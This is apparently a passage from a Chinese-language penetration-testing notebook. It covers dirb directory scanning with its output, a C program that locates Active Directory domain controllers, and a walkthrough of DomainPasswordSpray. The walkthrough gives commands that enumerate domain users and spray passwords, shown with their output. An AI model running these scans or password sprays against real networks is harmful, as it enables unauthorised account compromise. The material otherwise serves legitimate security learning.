‐a "Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> Googlebot<span class="token operator">/</span><span class="token number">2.1</span><span class="token punctuation">;</span> <span class="token operator">+</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>google<span class="token punctuation">.</span>com<span class="token operator">/</span>bot<span class="token punctuation">.</span>ht
ml<span class="token punctuation">)</span><span class="token string">" ‐c "</span>ASP<span class="token punctuation">.</span>NET_SessionId<span class="token operator">=</span>jennqviqmc2vws55o4ggwu45" ‐z <span class="token number">100</span>

‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
DIRB v2<span class="token punctuation">.</span><span class="token number">22</span>
By The Dark Raver
‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ 

START_TIME<span class="token punctuation">:</span> Sun Feb <span class="token number">17</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">54</span><span class="token punctuation">:</span><span class="token number">29</span> <span class="token number">2019</span>
URL_BASE<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token operator">/</span>
WORDLIST_FILES<span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token operator">/</span>DIR<span class="token punctuation">.</span>txt
USER_AGENT<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> Googlebot<span class="token operator">/</span><span class="token number">2.1</span><span class="token punctuation">;</span> <span class="token operator">+</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>googl
e<span class="token punctuation">.</span>com<span class="token operator">/</span>bot<span class="token punctuation">.</span>html<span class="token punctuation">)</span>
COOKIE<span class="token punctuation">:</span> ASP<span class="token punctuation">.</span>NET_SessionId<span class="token operator">=</span>jennqviqmc2vws55o4ggwu45
SPEED_DELAY<span class="token punctuation">:</span> <span class="token number">100</span> milliseconds 

‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐

GENERATED WORDS<span class="token punctuation">:</span> <span class="token number">1153</span> 

‐‐‐‐ Scanning URL<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token operator">/</span> ‐‐‐‐
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token comment">//include/ (CODE:403|SIZE:218)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token comment">//news/ (CODE:403|SIZE:218)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token comment">//include (CODE:301|SIZE:159)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token comment">//images/ (CODE:403|SIZE:218)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token comment">//sys/ (CODE:403|SIZE:218)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token comment">//images (CODE:301|SIZE:158) </span>

<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> FATAL<span class="token punctuation">:</span> Too many errors connecting to host
<span class="token punctuation">(</span>Possible cause<span class="token punctuation">:</span> EMPTY REPLY FROM SERVER<span class="token punctuation">)</span> 

‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
END_TIME<span class="token punctuation">:</span> Sun Feb <span class="token number">17</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">55</span><span class="token punctuation">:</span><span class="token number">50</span> <span class="token number">2019</span>
DOWNLOADED<span class="token punctuation">:</span> <span class="token number">673</span> ‐ FOUND<span class="token punctuation">:</span> <span class="token number">6</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201001214138497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>其他更多有趣的功能：</strong></p>
<pre><code class="prism language-c">DIRB v2<span class="token punctuation">.</span><span class="token number">22</span>
By The Dark Raver
‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ 

dirb <span class="token operator">&lt;</span>url_base<span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token function">wordlist_file</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span> 

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> NOTES <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token operator">&lt;</span>url_base<span class="token operator">&gt;</span> <span class="token punctuation">:</span> Base URL to scan<span class="token punctuation">.</span> <span class="token punctuation">(</span>Use ‐resume <span class="token keyword">for</span> session resuming<span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token function">wordlist_file</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token punctuation">:</span> List of wordfiles<span class="token punctuation">.</span> <span class="token punctuation">(</span>wordfile1<span class="token punctuation">,</span>wordfile2<span class="token punctuation">,</span>wordfile3<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> HOTKEYS <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
<span class="token string">'n'</span> ‐<span class="token operator">&gt;</span> Go to next directory<span class="token punctuation">.</span>
<span class="token string">'q'</span> ‐<span class="token operator">&gt;</span> Stop scan<span class="token punctuation">.</span> <span class="token punctuation">(</span>Saving state <span class="token keyword">for</span> resume<span class="token punctuation">)</span>
<span class="token string">'r'</span> ‐<span class="token operator">&gt;</span> Remaining scan stats<span class="token punctuation">.</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> OPTIONS <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
‐a <span class="token operator">&lt;</span>agent_string<span class="token operator">&gt;</span> <span class="token punctuation">:</span> Specify your custom USER_AGENT<span class="token punctuation">.</span>
‐b <span class="token punctuation">:</span> Use path as is<span class="token punctuation">.</span>
‐c <span class="token operator">&lt;</span>cookie_string<span class="token operator">&gt;</span> <span class="token punctuation">:</span> Set a cookie <span class="token keyword">for</span> the HTTP request<span class="token punctuation">.</span>
‐E <span class="token operator">&lt;</span>certificate<span class="token operator">&gt;</span> <span class="token punctuation">:</span> path to the client certificate<span class="token punctuation">.</span>
‐f <span class="token punctuation">:</span> Fine tunning of NOT_FOUND <span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span> detection<span class="token punctuation">.</span>
‐H <span class="token operator">&lt;</span>header_string<span class="token operator">&gt;</span> <span class="token punctuation">:</span> Add a custom header to the HTTP request<span class="token punctuation">.</span>
‐i <span class="token punctuation">:</span> Use <span class="token keyword">case</span>‐insensitive search<span class="token punctuation">.</span>
‐l <span class="token punctuation">:</span> Print <span class="token string">"Location"</span> header when found<span class="token punctuation">.</span>
‐N <span class="token operator">&lt;</span>nf_code<span class="token operator">&gt;</span><span class="token punctuation">:</span> Ignore responses with this HTTP code<span class="token punctuation">.</span>
‐o <span class="token operator">&lt;</span>output_file<span class="token operator">&gt;</span> <span class="token punctuation">:</span> Save output to disk<span class="token punctuation">.</span>
‐p <span class="token operator">&lt;</span>proxy<span class="token punctuation">[</span><span class="token punctuation">:</span>port<span class="token punctuation">]</span><span class="token operator">&gt;</span> <span class="token punctuation">:</span> Use this proxy<span class="token punctuation">.</span> <span class="token punctuation">(</span>Default port is <span class="token number">1080</span><span class="token punctuation">)</span>
‐P <span class="token operator">&lt;</span>proxy_username<span class="token punctuation">:</span>proxy_password<span class="token operator">&gt;</span> <span class="token punctuation">:</span> Proxy Authentication<span class="token punctuation">.</span>
‐r <span class="token punctuation">:</span> Don't search recursively<span class="token punctuation">.</span>
‐R <span class="token punctuation">:</span> Interactive recursion<span class="token punctuation">.</span> <span class="token punctuation">(</span>Asks <span class="token keyword">for</span> each directory<span class="token punctuation">)</span>
‐S <span class="token punctuation">:</span> Silent Mode<span class="token punctuation">.</span> Don't show tested words<span class="token punctuation">.</span> <span class="token punctuation">(</span>For dumb terminals<span class="token punctuation">)</span>
‐t <span class="token punctuation">:</span> Don<span class="token string">'t force an ending '</span><span class="token operator">/</span>' on URLs<span class="token punctuation">.</span>
‐u <span class="token operator">&lt;</span>username<span class="token punctuation">:</span>password<span class="token operator">&gt;</span> <span class="token punctuation">:</span> HTTP Authentication<span class="token punctuation">.</span>
‐v <span class="token punctuation">:</span> Show also NOT_FOUND pages<span class="token punctuation">.</span>
‐w <span class="token punctuation">:</span> Don't stop on WARNING messages<span class="token punctuation">.</span>
‐X <span class="token operator">&lt;</span>extensions<span class="token operator">&gt;</span> <span class="token operator">/</span> ‐x <span class="token operator">&lt;</span>exts_file<span class="token operator">&gt;</span> <span class="token punctuation">:</span> Append each word with this extensions<span class="token punctuation">.</span>
‐z <span class="token operator">&lt;</span>millisecs<span class="token operator">&gt;</span> <span class="token punctuation">:</span> Add a milliseconds delay to not cause excessive Flood<span class="token punctuation">.</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> EXAMPLES <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
dirb http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>url<span class="token operator">/</span>directory<span class="token operator">/</span> <span class="token punctuation">(</span>Simple Test<span class="token punctuation">)</span>
dirb http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>url<span class="token operator">/</span> ‐X <span class="token punctuation">.</span>html <span class="token punctuation">(</span>Test files with <span class="token string">'.html'</span> extension<span class="token punctuation">)</span>
dirb http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>url<span class="token operator">/</span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>dirb<span class="token operator">/</span>wordlists<span class="token operator">/</span>vulns<span class="token operator">/</span>apache<span class="token punctuation">.</span>txt <span class="token punctuation">(</span>Test wit hapache<span class="token punctuation">.</span>txt wordlist<span class="token punctuation">)</span>
dirb https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>secure_url<span class="token operator">/</span> <span class="token punctuation">(</span>Simple Test with SSL<span class="token punctuation">)</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201001214211164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>micro8<span class="token punctuation">.</span>gitbook<span class="token punctuation">.</span>io<span class="token operator">/</span>micro8<span class="token operator">/</span>contents<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">21</span><span class="token operator">-</span><span class="token number">30</span><span class="token operator">/</span><span class="token number">29</span><span class="token operator">-</span>fa<span class="token operator">-</span>xian<span class="token operator">-</span>mu<span class="token operator">-</span>biao<span class="token operator">-</span>web<span class="token operator">-</span>cheng<span class="token operator">-</span>xu<span class="token operator">-</span>min<span class="token operator">-</span>gan<span class="token operator">-</span>mu<span class="token operator">-</span>lu<span class="token operator">-</span>di<span class="token operator">-</span>yi<span class="token operator">-</span>ji
</code></pre>
<hr>
<h2><a id="532_SCF_9163"></a>5.3.2 基于SCF做目标内网信息搜集</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>lshack<span class="token punctuation">.</span>cn<span class="token operator">/</span><span class="token number">642</span><span class="token operator">/</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>gitlab<span class="token punctuation">.</span>com<span class="token operator">/</span>Tomotoes<span class="token operator">/</span>Micro8<span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span>blob<span class="token operator">/</span>b7c284fdbb53ff8ee60acff92d5ebbf1559dfd92<span class="token operator">/</span>第一百零一课：基于SCF做目标内网信息搜集第二季<span class="token punctuation">.</span>pdf
</code></pre>
<p>感谢Micro8大佬退役最后给出的文章思路…</p>
<hr>
<h2><a id="533__9174"></a>5.3.3 内网漏洞快速检测技巧</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xz<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>t<span class="token operator">/</span><span class="token number">2354</span>   <span class="token operator">--</span>good

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>anquanke<span class="token punctuation">.</span>com<span class="token operator">/</span>post<span class="token operator">/</span>id<span class="token operator">/</span><span class="token number">199012</span>
</code></pre>
<h2><a id="534__9181"></a>5.3.4 域环境信息搜集</h2>
<h2><a id="5341_Active_Directory_Domain_Services___9182"></a>5.3.4.1 Active Directory Domain Services - 获取域控信息</h2>
<p><strong>0x00 简介</strong></p>
<p>在内网中的域环境下，获取域控的信息有很多种，但是在此之前都是以经验来判定的。</p>
<p>而MSDN文档的API从未接触过，因此想多扩展一下知识面。</p>
<p>地址：<code>https://docs.microsoft.com/zh-cn/windows/desktop/api/_ad/</code></p>
<p><strong>0x01 域用户的登录过程</strong></p>
<p>参考：<code>https://blog.csdn.net/jsd2honey/article/details/54340439</code></p>
<p>1、客户端发起net logon 服务会 运行DsGetDcName这个API。</p>
<p>2、DsGetDcName就会从客户端收集DNS和site的信息。</p>
<p>3、Net logon 会根据IP地址找到相应的DNS服务器，并发送一个 DNS Query的数据包，查询site内所有DC的SRV记录和A记录。</p>
<p>4、DNS 服务器会返回一个 response数据包，里面包含site内所有DC的一张表格。如果DNS服务器不返回这个数据包，那么locate DC就失败了。</p>
<p>5、然后客户端 的netlogon就根据这张表格给每台DC都发送一个 Query 数据包。如果有多台DC都给客户端返回response的数据包，那么客户端以最先返回 response 为准，即客户端成功locate 到这台DC。但是如果没有DC返回响应数据包，那么locate DC也会失败。</p>
<p><strong>0x02 尝试学习API</strong></p>
<p>微软有一个Example：<code>https://docs.microsoft.com/zh-cn/windows/desktop/AD/enumerating-domain-controllers</code></p>
<p>准备花时间慢慢啃～</p>
<p>第一个API - <a href="https://docs.microsoft.com/zh-cn/windows/win32/api/dsgetdc/nf-dsgetdc-dsgetdcnamea">DsGetDcName</a></p>
<pre><code class="prism language-c">DSGETDCAPI DWORD <span class="token function">DsGetDcNameA</span><span class="token punctuation">(</span>
  IN LPCSTR                    ComputerName<span class="token punctuation">,</span>
  IN LPCSTR                    DomainName<span class="token punctuation">,</span>
  IN GUID                      <span class="token operator">*</span>DomainGuid<span class="token punctuation">,</span>
  IN LPCSTR                    SiteName<span class="token punctuation">,</span>
  IN ULONG                     Flags<span class="token punctuation">,</span>
  OUT PDOMAIN_CONTROLLER_INFOA <span class="token operator">*</span>DomainControllerInfo
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>关于参数的介绍都在文档中。</p>
<p><strong>0x03 获取域控信息</strong></p>
<p>我写了一个例子，获取域控的地址、GUID等信息，都保存在<code>DomainControllerInfo</code>：</p>
<pre><code class="prism language-c"><span class="token comment">// ConsoleApplication1.cpp : 定义控制台应用程序的入口点。</span>
<span class="token comment">//</span>

<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"stdafx.h"</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;DsGetDC.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Lm.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">pragma</span>  comment(lib, "NetApi32.lib")</span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	PDOMAIN_CONTROLLER_INFO  dcInfo<span class="token punctuation">;</span>
	DWORD ret <span class="token operator">=</span> <span class="token function">DsGetDcName</span><span class="token punctuation">(</span>
		<span class="token constant">NULL</span><span class="token punctuation">,</span>
		<span class="token constant">NULL</span><span class="token punctuation">,</span>
		<span class="token constant">NULL</span><span class="token punctuation">,</span>
		<span class="token constant">NULL</span><span class="token punctuation">,</span>
		DS_KDC_REQUIRED<span class="token punctuation">,</span>
		<span class="token operator">&amp;</span>dcInfo
	<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">==</span> ERROR_SUCCESS<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		GUID <span class="token operator">*</span> dc_guid <span class="token operator">=</span> <span class="token operator">&amp;</span>dcInfo<span class="token operator">-&gt;</span>DomainGuid<span class="token punctuation">;</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"DomainControllerName : %s \n "</span><span class="token punctuation">,</span> dcInfo<span class="token operator">-&gt;</span>DomainControllerName<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"DomainControllerAddress : %s \n "</span><span class="token punctuation">,</span> dcInfo<span class="token operator">-&gt;</span>DomainControllerAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"DomainGuid : %x-%x-%x-%x \n"</span><span class="token punctuation">,</span> dc_guid<span class="token operator">-&gt;</span>Data1<span class="token punctuation">,</span> dc_guid<span class="token operator">-&gt;</span>Data2<span class="token punctuation">,</span> dc_guid<span class="token operator">-&gt;</span>Data3<span class="token punctuation">,</span> dc_guid<span class="token operator">-&gt;</span>Data4<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">NetApiBufferFree</span><span class="token punctuation">(</span>dcInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Error : %d \n "</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201001215700419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
PDOMAIN_CONTROLLER_INFO的信息都在这里：<br>
<img src="https://img-blog.csdnimg.cn/20201001215714433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
其中要注意的是，DC的这些API都需要调用<code>NetApi32.lib</code>，并且包含<code>dsgetdc.h</code>：<br>
<img src="https://img-blog.csdnimg.cn/20201001215738328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考文章：<code>https://payloads.online/archivers/2019-04-12/1</code>  感谢倾旋</p>
<hr>
<h2><a id="5342_Windows_9274"></a>5.3.4.2 Windows域渗透-用户密码枚举</h2>
<p><strong>0x00 前言</strong></p>
<p>在进行Windows域渗透的时候，面对庞大的用户账号，不知该从何下手，扫描网络服务有怕搞出大动静，肿么办呢？</p>
<p><strong>0x01 Powershell</strong></p>
<p>目前已经有很多Powershell集合脚本，用于域渗透简直舒爽</p>
<p>今天推荐一款名字叫<code>DomainPasswordSpray.ps1</code>的脚本，主要原理是先来抓取域用户账号，然后指定密码字典进行域认证。认证通过的就是密码正确的了。<br>
<img src="https://img-blog.csdnimg.cn/20201001220113376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
GitHub项目地址：<code>https://github.com/dafthack/DomainPasswordSpray</code></p>
<p>由于作者的脚本有一个小瑕疵，故此我改了一下，避免抛出了一些错误。</p>
<p><img src="https://img-blog.csdnimg.cn/20201001220133710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
优化后的地址：<code>http://payloads.online/scripts/Invoke-DomainPasswordSpray.txt</code></p>
<p><strong>0x02 参数说明</strong></p>
<p>在代码的开头就已经有介绍了，我简单汉化一下。</p>
<p>描述：该模块主要用于从域中收集用户列表。</p>
<p>参数： <code>Domain</code> 指定要测试的域名<br>
参数： <code>RemoveDisabled</code> 尝试从用户列表删除禁用的账户<br>
参数： <code>RemovePotentialLockouts</code> 删除锁定账户<br>
参数： <code>UserList</code> 自定义用户列表(字典)。 如果未指定，这将自动从域中获取<br>
参数： <code>Password</code> 指定单个密码进行口令测试<br>
参数： <code>PasswordList</code> 指定一个密码字典<br>
参数： <code>OutFile</code> 将结果保存到某个文件<br>
参数： <code>Force</code> 当枚举出第一个后继续枚举，不询问</p>
<p><strong>0x03 使用说明</strong></p>
<p>使用例子：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\PS<span class="token operator">&gt;</span> Get<span class="token operator">-</span>DomainUserList
</code></pre>
<p>该命令将从域中收集用户列表。</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\PS<span class="token operator">&gt;</span> Get<span class="token operator">-</span>DomainUserList <span class="token operator">-</span>Domain 域名 <span class="token operator">-</span>RemoveDisabled <span class="token operator">-</span>RemovePotentialLockouts <span class="token operator">|</span> Out<span class="token operator">-</span>File <span class="token operator">-</span>Encoding ascii userlist<span class="token punctuation">.</span>txt
</code></pre>
<p>该命令将收集域“域名”中的用户列表，包括任何未被禁用且未接近锁定状态的帐户。 它会将结果写入“userlist.txt”文件中</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\PS<span class="token operator">&gt;</span> Invoke<span class="token operator">-</span>DomainPasswordSpray <span class="token operator">-</span>Password Winter2016
</code></pre>
<p>该命令将会从域环境中获取用户名，然后逐个以密码<code>Winter2016</code>进行认证枚举</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\PS<span class="token operator">&gt;</span> Invoke<span class="token operator">-</span>DomainPasswordSpray <span class="token operator">-</span>UserList users<span class="token punctuation">.</span>txt <span class="token operator">-</span>Domain 域名 <span class="token operator">-</span>PasswordList passlist<span class="token punctuation">.</span>txt <span class="token operator">-</span>OutFile sprayed<span class="token operator">-</span>creds<span class="token punctuation">.</span>txt
</code></pre>
<p>该命令将会从<code>users.txt</code>中提取用户名，与<code>passlist.txt</code>中的密码对照成一对口令，进行域认证枚举，登录成功的结果将会输出到<code>sprayed-creds.txt</code></p>
<p><strong>0x04 实战</strong></p>
<p><strong>获取域环境中的用户列表</strong></p>
<p>命令：<br>
<code>C:\PS&gt; Get-DomainUserList | Out-File -Encoding ascii userlist.txt</code></p>
<p><strong>输出：</strong></p>
<pre><code class="prism language-c"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Current domain is compatible with Fine<span class="token operator">-</span>Grained Password Policy<span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Now creating a list of users to spray<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> There appears to be no lockout policy<span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> There are <span class="token number">8</span> total users found<span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Created a userlist containing <span class="token number">8</span> users gathered from the current user's domain
</code></pre>
<p><strong>获取的用户名：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\PS<span class="token operator">&gt;</span> type <span class="token punctuation">.</span>\userlist<span class="token punctuation">.</span>txt
Administrator
Guest
liyingzhe
krbtgt
Hack
testPass
webManager
dba
</code></pre>
<p><strong>密码枚举</strong><br>
<img src="https://img-blog.csdnimg.cn/20201001220412672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
命令： <code>C:\PS&gt; Invoke-DomainPasswordSpray -Domain 域名 -Password w!23456 -OutFile sprayed-creds.txt</code></p>
<p>输出：</p>
<pre><code class="prism language-c"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Current domain is compatible with Fine<span class="token operator">-</span>Grained Password Policy<span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Now creating a list of users to spray<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> There appears to be no lockout policy<span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Removing disabled users from list<span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> There are <span class="token number">6</span> total users found<span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Removing users within <span class="token number">1</span> attempt of locking out from list<span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Created a userlist containing <span class="token number">6</span> users gathered from the current user's domain
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Password spraying has begun<span class="token punctuation">.</span> Current time is <span class="token number">18</span><span class="token punctuation">:</span><span class="token number">45</span>
